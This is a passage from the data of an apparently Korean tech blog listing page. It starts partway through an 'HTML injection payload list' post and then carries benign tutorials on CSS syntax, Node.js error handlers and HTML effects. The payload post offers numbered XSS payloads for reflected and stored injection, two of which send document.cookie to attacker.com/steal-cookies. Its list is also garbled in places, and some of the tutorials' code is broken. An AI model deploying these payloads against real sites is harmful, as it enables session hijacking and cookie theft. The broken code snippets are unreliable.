src=\"javascript:alert(‘반사된 HTML 주입’)\"`\n29. `img src=1 href=1 onerror=alert(‘반사된 HTML 주입’) /`\n30. `input type=\"hidden\" onkeypress=\"alert(‘반사된 HTML 주입’)\"`\n31. `audio onloadstart=\"alert(‘반사된 HTML 주입’)\"`\n32. `form onsubmit=\"alert(‘반사된 HTML 주입’)\"`\n33. `textarea onchange=\"alert(‘반사된 HTML 주입’)\"`\n34. `base href=\"javascript:alert(‘반사된 HTML 주입’)\"`\n35. `a href=\"javascript:alert(‘반사된 HTML 주입’)\"`여기를 클릭하세요`/a`\n36. `object data=\"javascript:alert(‘반사된 HTML 주입’)\"`\n37. `img src=\"x\" onmouseover=\"alert(‘반사된 HTML 주입’)\"`\n38. `script`document.write(‘`iframe src=\"https://attacker.com/steal-cookies?cookie=` + document.cookie + ‘\"``/iframe`’);`/script`\n39. `body background=\"javascript:alert(‘반사된 HTML 주입’)\"`\n40. `embed src=\"javascript:alert(‘반사된 HTML 주입’)\"`\n\n41. `svg/onload=alert(‘저장된 HTML 주입’)`\n42. `body onload=alert(‘저장된 HTML 주입’)`\n43. `img src=x onerror=alert(‘저장된 HTML 주입’)`\n44. `marquee onstart=alert(‘저장된 HTML 주입’)`\n45. `input type=\"image\" src=\"javascript:alert(‘저장된 HTML 주입’)\"`\n46. `img src=1 href=1 onerror=alert(‘저장된 HTML 주입’) /`\n47. `input type=\"hidden\" onkeypress=\"alert(‘저장된 HTML 주입’)\"`\n48. `audio onloadstart=\"alert(‘저장된 HTML 주입’)\"`\n49. `form onsubmit=\"alert(‘저장된 HTML 주입’)\"`\n50. `textarea onchange=\"alert(‘저장된 HTML 주입’)\"`\n51. `base href=\"javascript:alert(‘저장된 HTML 주입’)\"`\n52. `a href=\"javascript:alert(‘저장된 HTML 주입’)\"`여기를 클릭하세요`/a`\n53. `object data=\"javascript:alert(‘저장된 HTML 주입’)\"`\n54. `img src=\"x\" onmouseover=\"alert(‘저장된 HTML 주입’)\"`\n55. `script`document.write(‘`iframe src=\"https://attacker.com/steal-cookies?cookie=` + document.cookie + ‘\"``/iframe`’);`/script`\n56. `body background=\"javascript:alert(‘저장된 HTML 주입’)\"`\n57. `embed src=\"javascript:alert(‘저장된 HTML 주입’)\"`\n58. `img src=\"javascript:alert(‘저장된 HTML 주입’)\" onerror=\"alert(‘저장된 HTML 주입’)\"`\n59. `body``svg``script`alert(‘저장된 HTML 주입’)`/script``/svg``/body`\n60. `a href=\"data:text/html,`script`alert(‘저장된 HTML 주입’)`/script`\"`여기를 클릭하세요`/a`\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n반가워요! \n\n다음은 HTML 주입 페이로드 결과입니다:\n61. `svg/onload=alert(‘주입된 HTML 삽입’)`\n62. `body onload=alert(‘주입된 HTML 삽입’)`\n63. `img src=x onerror=alert(‘주입된 HTML 삽입’)`\n64. `marquee onstart=alert(‘Reflected HTML Injection’)`\n65. `input type=\"image\" src=\"javascript:alert(‘주입된 HTML 삽입’)\"`\n66. `img src=1 href=1 onerror=alert(‘주입된 HTML 삽입’) /`\n67. `input type=\"hidden\" onkeypress=\"alert(‘주입된 HTML 삽입’)\"`\n68. `audio onloadstart=\"alert(‘주입된 HTML 삽입’)\"`\n69. `form onsubmit=\"alert(‘주입된 HTML 삽입’)\"`\n70. `textarea onchange=\"alert(‘주입된 HTML 삽입’)\"`\n71. `base href=\"javascript:alert(‘주입된 HTML 삽입’)\"`\n72. `a href=\"javascript:alert(‘주입된 HTML 삽입’)\"`Click me`/a`\n73. `object data=\"javascript:alert(‘주입된 HTML 삽입’)\"\n74. `img src=\"x\" onmouseover=\"alert(‘주입된 HTML 삽입’)\"`\n... (중략)\n\n여기까지 주입을 시도해보고, 어디에 삽입해야 하는지 알려줘.... 찾아보세요..\n\n다음주 월요일에 만나요,\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n행복한 해킹! 해커들...","ogImage":{"url":"/assets/img/2024-05-02-HTMLINJECTIONPayloadList_0.png"},"coverImage":"/assets/img/2024-05-02-HTMLINJECTIONPayloadList_0.png","tag":["Tech"],"readingTime":5},{"title":"CSS 기초 문법 정리","description":"","date":"2024-05-02 00:01","slug":"2024-05-02-IntroductiontoCSSSyntax","content":"\n\n![CSS Syntax](/assets/img/2024-05-02-IntroductiontoCSSSyntax_0.png)\n\nCSS를 사용하는 규칙의 두 부분은 선언 블록과 선택자입니다.\n\n## CSS 구문:\n\n![CSS Syntax](/assets/img/2024-05-02-IntroductiontoCSSSyntax_1.png)\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n선택기는 스타일을 지정하려는 HTML 요소를 가리킵니다.\n\n각 선언은 콜론으로 구분된 CSS 속성 이름과 값으로 구성됩니다.\n\n# 예제:\n\n```js\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n\u003chead\u003e\n\u003cstyle\u003e\np {\n  color: red;\n  text-align: center;\n} \n\u003c/style\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n\n\u003cp\u003eHello World!\u003c/p\u003e\n\u003cp\u003eThese paragraphs are styled with CSS.\u003c/p\u003e\n\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n## 예시 설명:\n\n- CSS에서 P는 셀렉터입니다 (스타일을 적용할 HTML 요소를 가리킵니다: `p`).\n- Red는 속성(property)의 값인 색상입니다.\n- 속성의 값은 'center'이고, 사용된 속성은 text-align입니다.\n\n![이미지](/assets/img/2024-05-02-IntroductiontoCSSSyntax_2.png)\n\n# 읽어 주셔서 감사합니다!","ogImage":{"url":"/assets/img/2024-05-02-IntroductiontoCSSSyntax_0.png"},"coverImage":"/assets/img/2024-05-02-IntroductiontoCSSSyntax_0.png","tag":["Tech"],"readingTime":1},{"title":"Node.js에서 글로벌 에러 이벤트 핸들러를 활용해 오류 처리를 효율적으로 관리하기","description":"","date":"2024-05-02 00:00","slug":"2024-05-01-StreamliningErrorHandlinginNodejswithGlobalErrorEventHandlers","content":"\n\nNode.js 개발 세계에서는 오류를 세련되게 처리하는 것이 탄력적이고 유지보수가 간편한 애플리케이션을 구축하는 데 중요합니다. Node.js에서 오류를 관리하는 효과적인 방법 중 하나는 전역 오류 이벤트 핸들러를 사용하는 것입니다. 이 블로그 포스트에서는 Node.js 애플리케이션에서 전역 오류 처리를 구현하는 방법을 살펴보겠습니다. 이를 통해 전체 코드 베이스에서 일관된 오류 관리를 보장할 수 있습니다.\n\nNode.js의 오류 이벤트 이해\n\nNode.js는 처리되지 않은 프라미스 rejections, 처리되지 않은 예외, 및 프로세스 경고 등 다양한 유형의 오류가 발생할 때 오류 이벤트를 발생시킵니다. 이러한 이벤트를 청취함으로써 애플리케이션의 어디에서 발생하든간에 일관되게 오류를 포착하고 처리할 수 있습니다.\n\n전역 오류 이벤트 핸들러 구현하기\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\nNode.js에서 전역 오류 이벤트 핸들러를 만들려면 process 객체를 사용하여 다음과 같은 오류 이벤트를 수신할 수 있습니다:\n\n- uncaughtException — Node.js 프로세스 내에서 예외가 발생할 때 발생하는 이벤트입니다.\n- unhandledRejection — Node.js 프로세스 내에서 처리되지 않은 프로미스 거부가 발생했을 때 발생하는 이벤트입니다.\n- warning — Node.js 프로세스에서 경고가 발생할 때 발생하는 이벤트입니다.\n\n다음은 이러한 이벤트를 수신하고 오류를 기록하는 전역 오류 이벤트 핸들러의 간단한 예시입니다:\n\n```js\nprocess.on('uncaughtException', (error) =\u003e {\n  console.error('Uncaught Exception:', error);\n  // 옵션: 추가적인 오류 처리 수행, 예를 들어 오류 보고서를 전송하거나 프로세스를 종료합니다.\n});\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\nprocess.on('unhandledRejection', (error) =\u003e {\n  console.error('Unhandled Rejection:', error);\n  // 선택 사항: 추가 에러 처리 수행, 예를 들어 에러 보고서 전송 또는 프로세스 종료.\n});\nprocess.on('warning', (warning) =\u003e {\n  console.warn('Warning:', warning);\n  // 선택 사항: 추가 에러 처리 수행, 예를 들어 경고 보고서 전송 또는 경고 로깅.\n});\n```\n\n에러 처리 사용자 정의\n\n전역 에러 이벤트 핸들러를 설정한 후에는 애플리케이션이 에러에 응답하는 방식을 사용자 정의할 수 있습니다. 가능한 조치에는 다음이 포함됩니다:\n\n- Sentry 또는 Rollbar와 같은 외부 에러 모니터링 서비스로 에러 보고 전송.\n- Winston 또는 Bunyan과 같은 전용 로깅 라이브러리를 사용하여 에러 로깅.\n- 메모리 부족과 같은 심각한 에러의 경우 Node.js 프로세스를 안전하게 종료.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n최상의 방법\n\n올바른 오류 처리를 보장하기 위해 다음 최상의 방법을 따릅니다:\n\n- 코드에서 가능한 한 빨리 오류를 처리하여 전역 오류 처리기에 도달하는 것을 방지합니다.\n- 발생한 문제를 디버깅하는 데 도움이 되는 명확하고 설명적인 오류 메시지를 제공합니다.\n- 오류 모니터링 서비스와 로깅 라이브러리를 사용하여 오류를 추적하고 분석하여 문제에 예방적으로 대응하고 응용 프로그램의 안정성을 향상시킵니다.\n\nNode.js 애플리케이션에 전역 오류 이벤트 처리기를 구현함으로써 전체 코드베이스에서 오류를 효과적으로 관리할 수 있습니다. 이 방법을 통해 일관된 오류 처리 방식을 유지하고 오류에 효율적으로 대응하여 더 견고하고 안정적인 응용 프로그램을 구축할 수 있습니다.","ogImage":{"url":"/assets/img/2024-05-01-StreamliningErrorHandlinginNodejswithGlobalErrorEventHandlers_0.png"},"coverImage":"/assets/img/2024-05-01-StreamliningErrorHandlinginNodejswithGlobalErrorEventHandlers_0.png","tag":["Tech"],"readingTime":2},{"title":"웹사이트 만들 때 알아두면 유용한 HTML 효과 8가지","description":"","date":"2024-05-01 23:58","slug":"2024-05-01-8CoolHTMLEffectstoCreateanAwesomeWebsite","content":"\n\nCSS나 PHP를 알지 못해도 멋진 웹사이트를 만들 수 있다면, 이 멋진 HTML 효과 트릭 8가지를 사용하여 멋진 웹사이트를 만들어보세요. 멋진 웹사이트를 구축하고 싶지만 웹 개발에 대한 마스터 스킬이 없다면 걱정하지 마세요! CSS와 PHP를 알 필요가 없다면 이 멋진 HTML 효과 8가지를 선택하세요. 그리고 이 태그들을 HTML에 복사하고 붙이는 방법을 배워보세요.\n\n![8 Cool HTML Effects](/assets/img/2024-05-01-8CoolHTMLEffectstoCreateanAwesomeWebsite_0.png)\n\n일부 멋진 HTML 효과를 시작할 수 있도록 무료 코드 템플릿을 모았습니다. 이들은 돈을 지불하지 않고도 기능성과 사용자 경험을 증가시킵니다. HTML에서 이 멋진 코드들은 대부분 CSS와 PHP를 포함하고 있습니다.\n\n# 웹사이트에 추가할 수 있는 8 가지 멋진 HTML 효과\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n## 1. 멋진 HTML 패럴랙스 효과\n\n다른 웹사이트에서 온라인 광고로 사용된 패럴랙스 효과를 보셨죠?\n\n이 효과를 즐기고 이 효과를 담은 간단한 패럴랙스 효과 코드를 W3Schools에서 복사해보세요. 이 효과는 HTML, CSS, 그리고 JavaScript가 결합된 것입니다.\n\n## 2. 스크롤 가능한 HTML 댓글 상자 코드\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n가로스크롤 가능한 HTML 코멘트 상자 코드는 텍스트를 간결한 형태로 포장하는 데 도움이 되는 간단하지만 유용한 HTML 요소입니다. 그래서 페이지가 전체 공간을 제공하지 않습니다.\n\n만약 상자의 크기와 색상을 원하는 대로 변경하여 맞추고 싶다면 쉽게 변경할 수 있습니다.\n\n입력:\n\n```js\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n  \u003chead\u003e\n    \u003cmeta charset=\"UTF-8\" /\u003e\n    \u003cmeta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" /\u003e\n    \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /\u003e\n  \u003c/head\u003e\n  \u003cstyle\u003e\n    main {\n      padding: 20px;\n      display: block;\n      min-height: 100vh;\n      min-width: 100vh;\n    }\n    h2 {\n      text-align: center;\n      color: #004aad;\n    }\n    .comment-section {\n      max-height: 50vh;\n      max-width: 100%;\n      background-color: #004aad;\n      overflow-y: scroll;\n    }\n    .comment {\n      height: 10%;\n      padding: 2%;\n      margin: 2%;\n      background-color: #ffff;\n      color: black;\n    }\n  \u003c/style\u003e\n  \u003cbody\u003e\n    \u003ch2\u003eScrollable HTML Comment Box Code\u003c/h2\u003e\n    \u003cmain\u003e\n      \u003cdiv class=\"comment-section\"\u003e\n        \u003cdiv class=\"comment\"\u003eThis is first comment.\u003c/div\u003e\n        \u003cdiv class=\"comment\"\u003eThis is second comment.\u003c/div\u003e\n        \u003cdiv class=\"comment\"\u003eThis is third comment.\u003c/div\u003e\n        \u003cdiv class=\"comment\"\u003eThis is fourth comment.\u003c/div\u003e\n        \u003cdiv class=\"comment\"\u003eThis is fifth comment.\u003c/div\u003e\n        \u003cdiv class=\"comment\"\u003eThis is sixth comment.\u003c/div\u003e\n      \u003c/div\u003e\n    \u003c/main\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n만약 무언가 좀 더 멋있게 추가하고 싶다면, Quackit에서 커스터마이즈 가능한 코멘트 상자에 대한 코드를 가져올 수도 있어요.\n\n## 3. 멋진 HTML 요령: 강조 효과\n\n`span` 태그를 사용하면 텍스트나 이미지에 여러 가지 멋진 HTML 효과를 줄 수 있어요. 이 모든 작업은 브라우저에서 처리되기 때문에 Google Chrome, Microsoft Edge 및 Mozilla Firefox에서 작업할 수 있어요. 왜냐하면 이 브라우저들은 미리 정의된 HTML 코드를 가지고 있기 때문이에요.\n\n`span` 태그로 둘러싸인 텍스트는 이 HTML 텍스트 효과에 의해 강조되어요.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\nInput:\n\n\n```js\n\u003cspan style=\"background-color: #004aad\u003e highlighted text.\u003c/span\u003e\n```\n\n## 4. 텍스트에 배경 이미지 추가\n\n텍스트의 배경 이미지를 변경할 수 있습니다. 또한 텍스트의 색상도 변경할 수 있습니다. 자신이 원하는 시각으로 추가할 수 있습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n입력:\n\n```js\n\u003cspan style=\"배경 이미지: url(https://i0.wp.com/www.learnically.com/wp-content/uploads/2023/05/html-strucher.jpg resize=768%2C432\u0026ssl=1);  글꼴 크기: 20pt; \"\u003eLearnically가 제공하는...\u003c/span\u003e\n```\n\n동일한 효과는 `strong` 태그 내의 텍스트에 스타일 및 글꼴 요소를 추가하여도 동일하게 구현됩니다.\n\n## 5. 제목 툴팁 추가\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n툴팁은 텍스트나 이미지 위로 마우스를 올리면 나타납니다. 웹사이트에서 이미지, 링크된 텍스트 또는 데스크톱 앱의 메뉴 항목에서도 볼 수 있어요. 간단한 HTML을 웹페이지에 추가하여 이 HTML 효과를 사용해보세요.\n\n입력:\n\n```js\n\u003cspan title=\"이것이 툴팁입니다.\"\u003e마우스를 올려보세요!\u003c/span\u003e\n``` \n\n## 6. 텍스트 스크롤 또는 떨어지는 효과\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n구글에서 \"marquee HTML\"을 검색하면 상단에 검색 결과 수가 계속 스크롤되는 슬라이더가 있습니다. 이 효과는 현재 사용되지 않는 marquee 태그로 만들어집니다. 일부 브라우저에서는 이 효과가 제거되었지만 대부분의 브라우저에서는 여전히 지원합니다.\n\n입력:\n\n```js\n\u003cmarquee\u003eI wanna scroll with it\u003c/marquee\u003e\n```\n\n\"left\"를 \"right\"로 변경하여 텍스트를 스크롤하도록 스위치 추가하기.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n## 7. 메뉴를 HTML로 변경해보세요\n\n이 코드는 동적으로 사용될 때 HTML이 잘 작동합니다. 그러나 이 스크립트 사용 시, 메뉴를 만들어내는 효과가 매우 훌륭해요.\n\n이 코드는 평범한 HTML 태그보다는 복잡해요. 스타일 시트와 스크립트를 통해 작동하기 때문이죠. 간단하게 Dynamic Drive에서 코드를 복사해 `html` head 섹션에 붙여넣으면 됩니다.\n\n## 8. Tableizer로 HTML 스프레드시트 얻기\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n만약 웹 사이트에 스프레드시트를 표시하고 싶다면, Tableizer를 사용해보세요! 데이터를 HTML 테이블로 변환해줍니다. 엑셀, 구글 문서 또는 다른 스프레드시트에서 데이터를 복사하여 tableizer.journalistopia.com의 변환 도구에 붙여넣으세요. 테이블 옵션을 클릭한 후 Tableize It을 클릭하여 HTML 출력을 받아보세요.\n\n이것은 또한 웹사이트의 전체 HTML 코드 중에서 가장 좋은 코드가 될 것입니다. Tableize It!이 모든 어려운 작업을 처리하기 때문이죠.\n\nHTML 코드를 클릭하고 복사하여 웹 사이트에 추가하세요. 필요에 따라 몇 가지 편집 속성을 추가할 수 있습니다.\n\nHTML, CSS 및 JavaScript는 멋진 웹 사이트를 만드는 가장 강력한 옵션입니다. 그러나 단 8가지 멋진 HTML 효과만을 사용하여 기본적이지만 멋진 웹 사이트를 구축할 수도 있습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# 더 멋진 HTML 코드 사이트\n\n- HTML Goodies: 멋진 `span` 태그 아이디어를 제공합니다.\n- Dynamic Drive: 놀라운 동적 HTML 스크립트를 소개합니다.\n- Quackit: 멋진 HTML 코드를 제공합니다.\n\n이 8가지 멋진 HTML 효과들을 연습해보세요. 사용하면 사용할수록 익숙해질 거예요.\n\n이 글은 공식적으로 Learnically에 등재되어 있으며, 해당 사이트도 방문해보세요.","ogImage":{"url":"/assets/img/2024-05-01-8CoolHTMLEffectstoCreateanAwesomeWebsite_0.png"},"coverImage":"/assets/img/2024-05-01-8CoolHTMLEffectstoCreateanAwesomeWebsite_0.png","tag":["Tech"],"readingTime":5}],"page":"144","totalPageCount":151,"totalPageGroupCount":8,"lastPageGroup":11,"currentPageGroup":7},"__N_SSG":true},"page":"/posts/[page]","query":{"page":"144"},"buildId":"t9N7vwmpvBMQnO2PSctoH","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>